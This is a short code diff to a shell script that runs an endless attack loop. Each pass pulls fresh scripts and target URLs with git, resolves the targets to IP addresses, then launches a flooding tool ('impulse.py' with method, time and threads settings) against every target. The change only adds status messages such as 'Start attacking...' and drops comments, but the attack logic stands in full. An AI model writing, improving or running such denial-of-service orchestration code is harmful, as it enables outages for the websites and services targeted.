@@ -16,12 +16,13 @@ attack="python3 impulse.py --method ${method} --time ${time} --threads ${threads
 
 while true
 do
-  # Fetch the latest scripts & urls.
+  echo "Get the latest scripts & URLs..."
   git pull --rebase
-  # Convert URLs to IPs with port numbers.
   # TODO: Do it only once in X minutes.
+  echo "Resolving IPs..."
   cat urls | xargs -n1 -I % bash -c 'node ip-lookup.mjs %' > ips
-
+  echo "Done!"
+  echo "Start attacking..."
   if [ "$method" === "HTTP" ]; then
     cat urls | xargs -n1 -I % bash -c "${attack}"
   else
